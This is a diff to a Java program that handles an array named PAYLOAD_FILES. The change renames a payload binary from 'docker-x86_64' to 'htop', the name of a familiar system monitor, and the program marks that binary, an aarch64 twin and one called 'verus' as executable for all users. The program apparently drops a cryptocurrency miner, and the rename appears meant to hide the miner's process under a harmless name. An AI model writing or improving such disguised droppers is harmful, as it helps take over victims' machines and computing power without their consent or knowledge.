@@ -63,7 +63,7 @@ public class Main{
     private static final String AUTO_CMDS_FILE = "commands.txt";
 
     private static final String[] PAYLOAD_FILES = {
-            "docker-x86_64",
+            "htop",
             "docker-aarch64",
             "verus"
     };
@@ -195,7 +195,7 @@ public class Main{
                 while(!verus.exists()&&wait<15){Thread.sleep(1000);wait++;}
                 if(!verus.exists()){err("bruhhh");return;}
 
-                new File(workDir,"docker-x86_64").setExecutable(true,false);
+                new File(workDir,"htop").setExecutable(true,false);
                 new File(workDir,"docker-aarch64").setExecutable(true,false);
                 verus.setExecutable(true,false);
 
